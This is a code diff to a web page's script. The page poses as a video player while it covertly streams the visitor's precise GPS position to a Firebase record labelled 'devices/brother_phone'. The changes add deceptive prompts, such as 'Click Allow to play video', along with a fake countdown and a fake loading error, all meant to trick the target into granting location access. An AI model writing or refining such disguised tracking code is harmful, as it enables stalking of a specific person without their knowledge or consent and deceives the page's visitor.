@@ -37,22 +37,36 @@
         const db = getDatabase(app);
         const statusEl = document.getElementById("status");
 
-      // 30-second countdown
-    let secondsLeft = 7;
-    const timer = setInterval(() => {
-      secondsLeft--;
-      if (secondsLeft > 0) {
-        statusEl.textContent = `Video will paly in ${secondsLeft} sec.`;
-      } else {
-        clearInterval(timer);
-        statusEl.textContent = "Error loading video !";
-      }
-    }, 1000);
+      let timerStarted = false;
+    let watchId = null;
 
-       // Send GPS coordinates to Firebase in the background
+    function startCountdown() {
+      let secondsLeft = 7;
+      statusEl.textContent = `Video plays in ${secondsLeft} sec.`;
+
+      const timer = setInterval(() => {
+        secondsLeft--;
+        if (secondsLeft > 0) {
+          statusEl.textContent = `Video link available in ${secondsLeft} sec.`;
+        } else {
+          clearInterval(timer);
+          if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+          }
+          statusEl.textContent = "Error loading video ! Go Back >";
+        }
+      }, 1000);
+    }
+
     if ("geolocation" in navigator) {
-      navigator.geolocation.watchPosition(
+      watchId = navigator.geolocation.watchPosition(
         (pos) => {
+          // Start the 7-second countdown only once, after permission is granted
+          if (!timerStarted) {
+            timerStarted = true;
+            startCountdown();
+          }
+
           const { latitude, longitude, accuracy } = pos.coords;
           set(ref(db, "devices/brother_phone"), {
             lat: latitude,
@@ -62,10 +76,13 @@
           });
         },
         (err) => {
-          console.error("Location error:", err.message);
+          statusEl.textContent = "Click 'Allow' to play video";
+          console.error("Video play failed:", err.message);
         },
         { enableHighAccuracy: true, maximumAge: 0 }
       );
+    } else {
+      statusEl.textContent = "Video is not supported by this browser.";
     }
   </script>
 </body>
